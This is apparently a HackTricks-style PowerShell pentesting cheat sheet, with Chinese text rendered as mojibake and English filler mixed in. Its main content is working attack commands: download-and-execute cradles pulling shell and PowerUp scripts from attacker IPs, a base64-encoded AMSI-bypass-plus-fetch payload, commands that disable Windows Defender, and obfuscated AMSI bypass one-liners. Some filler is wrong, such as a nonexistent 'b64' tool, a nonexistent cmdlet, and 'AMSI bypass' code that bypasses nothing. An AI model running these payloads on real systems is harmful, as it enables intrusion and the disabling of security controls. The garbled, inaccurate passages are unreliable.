# åŸºæœ¬çš„PowerShellæŠ€å·§

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘å¹³å° â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitchç›´æ’­ ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTubeé¢‘é“ ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricksä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloudä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## é»˜è®¤çš„PowerShellä½ç½®
```powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```
## å¼€å§‹çš„åŸºæœ¬PSå‘½ä»¤

PowerShell (PS) æ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºåœ¨Windowsç³»ç»Ÿä¸Šæ‰§è¡Œå„ç§ä»»åŠ¡ã€‚å¯¹äºæ¸—é€æµ‹è¯•äººå‘˜æ¥è¯´ï¼Œç†Ÿæ‚‰ä¸€äº›åŸºæœ¬çš„PSå‘½ä»¤æ˜¯éå¸¸é‡è¦çš„ã€‚ä¸‹é¢æ˜¯ä¸€äº›å¸¸ç”¨çš„åŸºæœ¬PSå‘½ä»¤ï¼š

### è·å–å½“å‰ç›®å½•

```powershell
Get-Location
```

æ­¤å‘½ä»¤ç”¨äºè·å–å½“å‰æ‰€åœ¨çš„ç›®å½•ã€‚

### åˆ‡æ¢ç›®å½•

```powershell
Set-Location <ç›®å½•è·¯å¾„>
```

ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥åˆ‡æ¢åˆ°æŒ‡å®šçš„ç›®å½•ã€‚

### åˆ—å‡ºç›®å½•å†…å®¹

```powershell
Get-ChildItem
```

ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥åˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶å’Œå­ç›®å½•ã€‚

### åˆ›å»ºæ–°ç›®å½•

```powershell
New-Item -ItemType Directory -Path <ç›®å½•è·¯å¾„>
```

ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥åœ¨æŒ‡å®šè·¯å¾„ä¸‹åˆ›å»ºæ–°çš„ç›®å½•ã€‚

### å¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•

```powershell
Copy-Item -Path <æºè·¯å¾„> -Destination <ç›®æ ‡è·¯å¾„>
```

ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥å¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•åˆ°æŒ‡å®šçš„ç›®æ ‡è·¯å¾„ã€‚

### ç§»åŠ¨æ–‡ä»¶æˆ–ç›®å½•

```powershell
Move-Item -Path <æºè·¯å¾„> -Destination <ç›®æ ‡è·¯å¾„>
```

ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥å°†æ–‡ä»¶æˆ–ç›®å½•ç§»åŠ¨åˆ°æŒ‡å®šçš„ç›®æ ‡è·¯å¾„ã€‚

### åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•

```powershell
Remove-Item -Path <è·¯å¾„> -Recurse
```

ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥åˆ é™¤æŒ‡å®šçš„æ–‡ä»¶æˆ–ç›®å½•ã€‚ä½¿ç”¨ `-Recurse` å‚æ•°å¯ä»¥åˆ é™¤ç›®å½•åŠå…¶å†…å®¹ã€‚

### æ˜¾ç¤ºæ–‡ä»¶å†…å®¹

```powershell
Get-Content <æ–‡ä»¶è·¯å¾„>
```

ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥æ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„å†…å®¹ã€‚

### ç¼–è¾‘æ–‡ä»¶

```powershell
Set-Content -Path <æ–‡ä»¶è·¯å¾„> -Value <å†…å®¹>
```

ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥ç¼–è¾‘æŒ‡å®šæ–‡ä»¶çš„å†…å®¹ã€‚

### è¿è¡Œè„šæœ¬

```powershell
.\<è„šæœ¬æ–‡ä»¶å>.ps1
```

ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥è¿è¡ŒæŒ‡å®šçš„PowerShellè„šæœ¬æ–‡ä»¶ã€‚

ä»¥ä¸Šæ˜¯ä¸€äº›åŸºæœ¬çš„PSå‘½ä»¤ï¼Œå®ƒä»¬å¯ä»¥å¸®åŠ©ä½ åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­æ‰§è¡Œå„ç§ä»»åŠ¡ã€‚ç†Ÿç»ƒæŒæ¡è¿™äº›å‘½ä»¤å°†æé«˜ä½ çš„æ•ˆç‡å’ŒæŠ€èƒ½ã€‚
```powershell
Get-Help * #List everything loaded
Get-Help process #List everything containing "process"
Get-Help Get-Item -Full #Get full helpabout a topic
Get-Help Get-Item -Examples #List examples
Import-Module <modulepath>
Get-Command -Module <modulename>
```
## ä¸‹è½½å’Œæ‰§è¡Œ

To download and execute a file using PowerShell, you can use the following command:

```powershell
Invoke-WebRequest -Uri <URL> -OutFile <OutputFile>; .\<OutputFile>
```

Replace `<URL>` with the URL of the file you want to download, and `<OutputFile>` with the desired name of the downloaded file.

ä½¿ç”¨PowerShellä¸‹è½½å’Œæ‰§è¡Œæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Invoke-WebRequest -Uri <URL> -OutFile <OutputFile>; .\<OutputFile>
```

å°†`<URL>`æ›¿æ¢ä¸ºè¦ä¸‹è½½çš„æ–‡ä»¶çš„URLï¼Œå°†`<OutputFile>`æ›¿æ¢ä¸ºä¸‹è½½æ–‡ä»¶çš„æ‰€éœ€åç§°ã€‚

This command uses the `Invoke-WebRequest` cmdlet to download the file from the specified URL and save it to the local system. The `-OutFile` parameter specifies the name of the output file.

è¯¥å‘½ä»¤ä½¿ç”¨`Invoke-WebRequest` cmdletä»æŒ‡å®šçš„URLä¸‹è½½æ–‡ä»¶å¹¶ä¿å­˜åˆ°æœ¬åœ°ç³»ç»Ÿã€‚`-OutFile`å‚æ•°æŒ‡å®šè¾“å‡ºæ–‡ä»¶çš„åç§°ã€‚

After the file is downloaded, the second part of the command `.\<OutputFile>` executes the downloaded file.

æ–‡ä»¶ä¸‹è½½å®Œæˆåï¼Œå‘½ä»¤çš„ç¬¬äºŒéƒ¨åˆ†`.\<OutputFile>`æ‰§è¡Œä¸‹è½½çš„æ–‡ä»¶ã€‚

It's important to note that executing downloaded files can be dangerous, as they may contain malicious code. Exercise caution and ensure that you trust the source of the file before executing it.

éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ‰§è¡Œä¸‹è½½çš„æ–‡ä»¶å¯èƒ½å­˜åœ¨å±é™©ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½åŒ…å«æ¶æ„ä»£ç ã€‚åœ¨æ‰§è¡Œä¹‹å‰ï¼Œè¯·è°¨æ…è¡Œäº‹ï¼Œå¹¶ç¡®ä¿ä¿¡ä»»æ–‡ä»¶çš„æ¥æºã€‚
```powershell
g
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #From cmd download and execute
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.9:8000/ipw.ps1',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://10.10.14.9:8000/ipw.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(

#https://twitter.com/Alh4zr3d/status/1566489367232651264
#host a text record with your payload at one of your (unburned) domains and do this:
powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
```
### ä½¿ç”¨ AMSI Bypass åå°ä¸‹è½½å’Œæ‰§è¡Œ

This technique allows you to download and execute a file in the background while bypassing AMSI (Antimalware Scan Interface).

#### Usage

```powershell
Invoke-WebRequest -Uri "http://example.com/file.exe" -OutFile "C:\path\to\file.exe"
Start-Process -FilePath "C:\path\to\file.exe" -WindowStyle Hidden
```

Replace `"http://example.com/file.exe"` with the URL of the file you want to download, and `"C:\path\to\file.exe"` with the desired path and filename for the downloaded file.

#### Explanation

1. The `Invoke-WebRequest` cmdlet is used to download the file from the specified URL and save it to the specified path.
2. The `Start-Process` cmdlet is used to execute the downloaded file. The `-WindowStyle Hidden` parameter ensures that the process runs in the background without displaying any windows.

By using this technique, you can download and execute files without triggering AMSI detection, allowing you to maintain stealth during your activities.
```powershell
Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA="
```
### åœ¨Linuxä¸­ä½¿ç”¨b64

The `b64` command in Linux is a useful tool for encoding and decoding data in Base64 format. It can be used to convert binary data into a text format that is easily readable and transferable.

To encode a file using `b64`, you can use the following command:

```bash
b64 -e <input_file> > <output_file>
```

Replace `<input_file>` with the path to the file you want to encode, and `<output_file>` with the desired name and location for the encoded file.

To decode a file using `b64`, you can use the following command:

```bash
b64 -d <input_file> > <output_file>
```

Replace `<input_file>` with the path to the file you want to decode, and `<output_file>` with the desired name and location for the decoded file.

Using the `b64` command in Linux can be helpful in various scenarios, such as encoding sensitive data for secure transmission or decoding encoded files received during a penetration test.
```powershell
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```
## ä¸‹è½½

### System.Net.WebClient

æ‚¨å¯ä»¥ä½¿ç”¨`System.Net.WebClient`ç±»æ¥ä¸‹è½½æ–‡ä»¶ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨`DownloadFile`æ–¹æ³•ä¸‹è½½æ–‡ä»¶çš„ç¤ºä¾‹ä»£ç ï¼š

```powershell
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile("https://example.com/file.txt", "C:\path\to\save\file.txt")
```

åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª`System.Net.WebClient`å¯¹è±¡ï¼Œå¹¶ä½¿ç”¨`DownloadFile`æ–¹æ³•ä¸‹è½½æ–‡ä»¶ã€‚æ‚¨éœ€è¦æä¾›è¦ä¸‹è½½çš„æ–‡ä»¶çš„URLå’Œè¦ä¿å­˜æ–‡ä»¶çš„è·¯å¾„ã€‚

### System.Net.HttpWebRequest

å¦ä¸€ç§ä¸‹è½½æ–‡ä»¶çš„æ–¹æ³•æ˜¯ä½¿ç”¨`System.Net.HttpWebRequest`ç±»ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨`GetResponse`æ–¹æ³•ä¸‹è½½æ–‡ä»¶çš„ç¤ºä¾‹ä»£ç ï¼š

```powershell
$url = "https://example.com/file.txt"
$outputFile = "C:\path\to\save\file.txt"

$request = [System.Net.HttpWebRequest]::Create($url)
$response = $request.GetResponse()
$stream = $response.GetResponseStream()
$streamReader = New-Object System.IO.StreamReader($stream)
$fileContent = $streamReader.ReadToEnd()

$streamReader.Close()
$response.Close()

Set-Content -Path $outputFile -Value $fileContent
```

åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª`System.Net.HttpWebRequest`å¯¹è±¡ï¼Œå¹¶ä½¿ç”¨`GetResponse`æ–¹æ³•è·å–æ–‡ä»¶çš„å“åº”ã€‚ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨`GetResponseStream`æ–¹æ³•è·å–å“åº”çš„æµï¼Œå¹¶ä½¿ç”¨`StreamReader`ç±»è¯»å–æµä¸­çš„å†…å®¹ã€‚æœ€åï¼Œæˆ‘ä»¬ä½¿ç”¨`Set-Content` cmdletå°†æ–‡ä»¶å†…å®¹å†™å…¥æŒ‡å®šçš„è¾“å‡ºæ–‡ä»¶ä¸­ã€‚

æ— è®ºæ‚¨é€‰æ‹©ä½¿ç”¨`System.Net.WebClient`è¿˜æ˜¯`System.Net.HttpWebRequest`ï¼Œéƒ½å¯ä»¥æ ¹æ®æ‚¨çš„éœ€æ±‚é€‰æ‹©é€‚åˆçš„æ–¹æ³•æ¥ä¸‹è½½æ–‡ä»¶ã€‚
```powershell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
```
### è°ƒç”¨-ç½‘ç»œè¯·æ±‚

`Invoke-WebRequest` æ˜¯ PowerShell ä¸­çš„ä¸€ä¸ªå‘½ä»¤ï¼Œç”¨äºå‘é€ HTTP æˆ– HTTPS è¯·æ±‚å¹¶è·å–å“åº”ã€‚å®ƒå¯ä»¥ç”¨äºåœ¨æ¸—é€æµ‹è¯•ä¸­æ‰§è¡Œå„ç§ç½‘ç»œæ“ä½œï¼Œå¦‚è·å–ç½‘é¡µå†…å®¹ã€æäº¤è¡¨å•æ•°æ®ç­‰ã€‚

#### è¯­æ³•

```powershell
Invoke-WebRequest [-Uri] <string> [-Method <string>] [-Headers <hashtable>] [-Body <string>] [-ContentType <string>] [-UserAgent <string>] [-Proxy <Uri>] [-ProxyCredential <PSCredential>] [-TimeoutSec <int>] [-SessionVariable <string>] [-UseBasicParsing] [<CommonParameters>]
```

#### å‚æ•°

- `-Uri`ï¼šæŒ‡å®šè¦è¯·æ±‚çš„ URLã€‚
- `-Method`ï¼šæŒ‡å®šè¯·æ±‚çš„æ–¹æ³•ï¼Œå¦‚ GETã€POST ç­‰ã€‚
- `-Headers`ï¼šæŒ‡å®šè¯·æ±‚çš„å¤´éƒ¨ä¿¡æ¯ã€‚
- `-Body`ï¼šæŒ‡å®šè¯·æ±‚çš„ä¸»ä½“å†…å®¹ã€‚
- `-ContentType`ï¼šæŒ‡å®šè¯·æ±‚çš„å†…å®¹ç±»å‹ã€‚
- `-UserAgent`ï¼šæŒ‡å®šè¯·æ±‚çš„ç”¨æˆ·ä»£ç†ã€‚
- `-Proxy`ï¼šæŒ‡å®šè¯·æ±‚çš„ä»£ç†æœåŠ¡å™¨ã€‚
- `-ProxyCredential`ï¼šæŒ‡å®šä»£ç†æœåŠ¡å™¨çš„å‡­æ®ã€‚
- `-TimeoutSec`ï¼šæŒ‡å®šè¯·æ±‚çš„è¶…æ—¶æ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ã€‚
- `-SessionVariable`ï¼šæŒ‡å®šå°†å“åº”ä¿å­˜åˆ°çš„ä¼šè¯å˜é‡ã€‚
- `-UseBasicParsing`ï¼šä½¿ç”¨åŸºæœ¬è§£æå™¨æ¥å¤„ç†å“åº”ã€‚

#### ç¤ºä¾‹

ä»¥ä¸‹ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨ `Invoke-WebRequest` å‘é€ GET è¯·æ±‚å¹¶è·å–å“åº”çš„å†…å®¹ï¼š

```powershell
$response = Invoke-WebRequest -Uri "https://example.com"
$response.Content
```

è¿™å°†å‘é€ä¸€ä¸ª GET è¯·æ±‚åˆ° `https://example.com` å¹¶å°†å“åº”çš„å†…å®¹æ‰“å°å‡ºæ¥ã€‚

#### æ³¨æ„äº‹é¡¹

- åœ¨ä½¿ç”¨ `Invoke-WebRequest` æ—¶ï¼Œè¯·ç¡®ä¿å·²ç»è·å¾—äº†åˆæ³•çš„æˆæƒï¼Œä»¥éµå®ˆæ³•å¾‹å’Œé“å¾·è§„èŒƒã€‚
- åœ¨æ¸—é€æµ‹è¯•ä¸­ä½¿ç”¨ `Invoke-WebRequest` æ—¶ï¼Œåº”è¯¥è°¨æ…å¤„ç†æ•æ„Ÿä¿¡æ¯ï¼Œä»¥å…é€ æˆæ•°æ®æ³„éœ²æˆ–å…¶ä»–å®‰å…¨é£é™©ã€‚
```powershell
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
```
### Wget

Wget is a command-line utility that allows you to download files from the internet. It supports downloading files using various protocols such as HTTP, HTTPS, and FTP. Wget is commonly used in penetration testing to retrieve files from target systems.

To use Wget, you need to open a command prompt or terminal and enter the following command:

```
wget [URL]
```

Replace `[URL]` with the URL of the file you want to download. Wget will then retrieve the file and save it to your current directory.

You can also specify additional options with the `wget` command. For example, you can use the `-O` option to specify a different name for the downloaded file:

```
wget -O [filename] [URL]
```

Replace `[filename]` with the desired name for the downloaded file.

Wget also supports resuming interrupted downloads using the `-c` option. This can be useful if a download is interrupted or if you want to continue a previous download:

```
wget -c [URL]
```

In addition, you can limit the download speed using the `--limit-rate` option. This can be helpful to avoid overwhelming the target system or to simulate a slower network connection:

```
wget --limit-rate=[speed] [URL]
```

Replace `[speed]` with the desired download speed in bytes per second.

Wget is a powerful tool for downloading files during penetration testing. It provides flexibility and control over the download process, making it a valuable asset for any pentester.
```powershell
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
```
### BitsTransfer

BitsTransfer æ˜¯ä¸€ç§åœ¨ PowerShell ä¸­ä½¿ç”¨çš„å·¥å…·ï¼Œç”¨äºåœ¨è®¡ç®—æœºä¹‹é—´ä¼ è¾“æ–‡ä»¶ã€‚å®ƒå¯ä»¥å¸®åŠ©æ¸—é€æµ‹è¯•äººå‘˜åœ¨æ‰§è¡Œæ”»å‡»æ—¶å¿«é€Ÿã€é«˜æ•ˆåœ°ä¼ è¾“æ–‡ä»¶ã€‚

BitsTransfer æä¾›äº†ä¸€ç§ç®€å•çš„æ–¹æ³•æ¥ä¸‹è½½å’Œä¸Šä¼ æ–‡ä»¶ï¼Œè€Œæ— éœ€ç¼–å†™å¤æ‚çš„ä»£ç ã€‚å®ƒä½¿ç”¨åå°ä»»åŠ¡æ¥å¤„ç†æ–‡ä»¶ä¼ è¾“ï¼Œå› æ­¤å¯ä»¥åœ¨åå°è¿è¡Œï¼Œè€Œä¸ä¼šå¹²æ‰°æ¸—é€æµ‹è¯•äººå‘˜çš„å…¶ä»–æ“ä½œã€‚

ä½¿ç”¨ BitsTransferï¼Œæ¸—é€æµ‹è¯•äººå‘˜å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œç•Œé¢æˆ–è„šæœ¬æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š

- ä¸‹è½½æ–‡ä»¶ï¼šä»ç›®æ ‡è®¡ç®—æœºä¸‹è½½æ–‡ä»¶åˆ°æœ¬åœ°è®¡ç®—æœºã€‚
- ä¸Šä¼ æ–‡ä»¶ï¼šå°†æœ¬åœ°è®¡ç®—æœºä¸Šçš„æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡è®¡ç®—æœºã€‚
- ç›‘è§†ä¼ è¾“è¿›åº¦ï¼šå®æ—¶ç›‘è§†æ–‡ä»¶ä¼ è¾“çš„è¿›åº¦å’ŒçŠ¶æ€ã€‚

ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ BitsTransfer å‘½ä»¤ç¤ºä¾‹ï¼š

```powershell
# ä¸‹è½½æ–‡ä»¶
Start-BitsTransfer -Source "http://example.com/file.txt" -Destination "C:\path\to\save\file.txt"

# ä¸Šä¼ æ–‡ä»¶
Start-BitsTransfer -Source "C:\path\to\file.txt" -Destination "\\target\share\file.txt"

# ç›‘è§†ä¼ è¾“è¿›åº¦
Get-BitsTransfer -AllUsers | Select-Object -Property JobId, DisplayName, BytesTotal, BytesTransferred, JobState
```

BitsTransfer æ˜¯æ¸—é€æµ‹è¯•äººå‘˜åœ¨è¿›è¡Œæ”»å‡»æ—¶çš„æœ‰ç”¨å·¥å…·ä¹‹ä¸€ã€‚å®ƒæä¾›äº†ä¸€ç§å¿«é€Ÿã€ç®€å•çš„æ–¹æ³•æ¥ä¼ è¾“æ–‡ä»¶ï¼Œä½¿æ¸—é€æµ‹è¯•äººå‘˜èƒ½å¤Ÿæ›´é«˜æ•ˆåœ°æ‰§è¡Œä»»åŠ¡ã€‚
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
# OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
## Base64 Kali & EncodedCommand

### Base64 Kali

Kali Linux is a popular penetration testing distribution that comes with a wide range of tools for various hacking techniques. One of the techniques commonly used in Kali Linux is encoding commands in Base64.

Base64 is a binary-to-text encoding scheme that allows binary data to be represented in an ASCII string format. This encoding is often used to transmit binary data over text-based protocols, such as email or HTTP.

In Kali Linux, you can use the `base64` command-line tool to encode and decode data in Base64. To encode a command in Base64, you can use the following syntax:

```bash
echo -n "command" | base64
```

The `-n` option is used to remove the trailing newline character from the command output before encoding it.

To decode a Base64-encoded command, you can use the following syntax:

```bash
echo -n "encoded_command" | base64 -d
```

The `-d` option is used to decode the Base64-encoded data.

Base64 encoding can be useful in scenarios where you need to obfuscate or hide the command you are executing, making it harder for defenders to detect and analyze your actions.

### EncodedCommand

In PowerShell, the `EncodedCommand` parameter allows you to pass a Base64-encoded command as a parameter to the `powershell.exe` command-line tool. This parameter is often used in various hacking techniques to execute malicious PowerShell commands without directly exposing them in clear text.

To use the `EncodedCommand` parameter, you need to encode your PowerShell command in Base64. You can do this using the `ConvertTo-Base64String` cmdlet in PowerShell. Here's an example:

```powershell
$command = "Write-Host 'Hello, World!'"
$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
```

In this example, we first define our PowerShell command (`Write-Host 'Hello, World!'`). Then, we use the `ConvertTo-Base64String` method to encode the command in Base64. The resulting encoded command can be passed as a value to the `EncodedCommand` parameter.

To execute the Base64-encoded command using the `EncodedCommand` parameter, you can use the following syntax:

```bash
powershell.exe -EncodedCommand "encoded_command"
```

By using the `EncodedCommand` parameter, you can bypass some security measures that may block or detect the execution of certain PowerShell commands. However, it's important to note that this technique can still be detected and mitigated by advanced security solutions.
```powershell
kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
PS> powershell -EncodedCommand <Base64>
```
## [æ‰§è¡Œç­–ç•¥](../authentication-credentials-uac-and-efs.md#ps-execution-policy)

## [å—é™è¯­è¨€](broken-reference/)

## [AppLockerç­–ç•¥](broken-reference/)

## å¯ç”¨WinRMï¼ˆè¿œç¨‹PSï¼‰
```powershell
enable-psremoting -force #This enables winrm

# Change NetWorkConnection Category to Private
#Requires -RunasAdministrator

Get-NetConnectionProfile |
Where{ $_.NetWorkCategory -ne 'Private'} |
ForEach {
$_
$_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
}
```
## ç¦ç”¨Defender

{% code overflow="wrap" %}
```powershell
# Check status
Get-MpComputerStatus
Get-MpPreference | select Exclusion* | fl #Check exclusions
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
#To completely disable Windows Defender on a computer, use the command:
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Set exclusion path
Set-MpPreference -ExclusionPath (pwd) -disablerealtimemonitoring
Add-MpPreference -ExclusionPath (pwd)

# Check exclusions configured via GPO
Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```
{% endcode %}

### AMSIç»•è¿‡

**`amsi.dll`** è¢«**åŠ è½½**åˆ°ä½ çš„è¿›ç¨‹ä¸­ï¼Œå¹¶ä¸”å…·æœ‰ä¸ä»»ä½•åº”ç”¨ç¨‹åºè¿›è¡Œäº¤äº’æ‰€éœ€çš„**å¯¼å‡ºå‡½æ•°**ã€‚ç”±äºå®ƒè¢«åŠ è½½åˆ°ä½ æ‰€æ§åˆ¶çš„è¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­ï¼Œä½ å¯ä»¥é€šè¿‡**è¦†ç›–å†…å­˜ä¸­çš„æŒ‡ä»¤**æ¥æ”¹å˜å®ƒçš„è¡Œä¸ºï¼Œä½¿å…¶æ— æ³•æ£€æµ‹åˆ°ä»»ä½•ä¸œè¥¿ã€‚

å› æ­¤ï¼Œä½ çš„ç›®æ ‡æ˜¯é€šè¿‡åœ¨å†…å­˜ä¸­**è¦†ç›–è¯¥DLLçš„æŒ‡ä»¤**ï¼Œä½¿æ£€æµ‹å˜å¾—æ— æ•ˆã€‚

**AMSIç»•è¿‡ç”Ÿæˆå™¨**ç½‘é¡µï¼š[**https://amsi.fail/**](https://amsi.fail/)
```powershell
# A Method
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)

# Another: from https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'NonPublic,Static').
SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
